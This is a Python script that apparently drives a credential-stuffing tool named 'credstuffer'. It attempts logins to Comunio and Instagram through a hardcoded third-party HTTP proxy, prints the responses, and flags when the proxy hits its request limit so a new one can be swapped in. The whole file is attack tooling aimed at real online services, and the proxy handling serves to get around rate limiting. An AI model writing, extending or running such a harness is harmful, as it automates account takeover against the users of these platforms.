import logging
from credstuffer import UserAccount
from credstuffer.logins import Comunio, Instagram, Facebook
from credstuffer.exceptions import ProxyMaxRequestError

class Stuffing:

    def __init__(self):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Stuffing')

        self.accounts = []
        # create account instances
        self.comunio = Comunio()
        self.instagram = Instagram()
        self.accounts.append(self.comunio)
        self.accounts.append(self.instagram)

        self.proxy_dict = {
            'http': 'http://167.71.131.76:8080'
        }
    def run(self):
        """

        :return:
        """

        for account in self.accounts:
            try:
                # handle user accounts
                if isinstance(account, UserAccount):
                    account.set_proxy(proxy=self.proxy_dict)
                    response = account.login('bierschi', 'test')
                    if response is not None:
                        print(response.status_code)
                        print(response.text)
                # handle email accounts
                else:
                    response = account.login('bierschi', 'test')
            except ProxyMaxRequestError:
                print("need new Proxy")

if __name__ == '__main__':
    stuf = Stuffing()
    stuf.run()
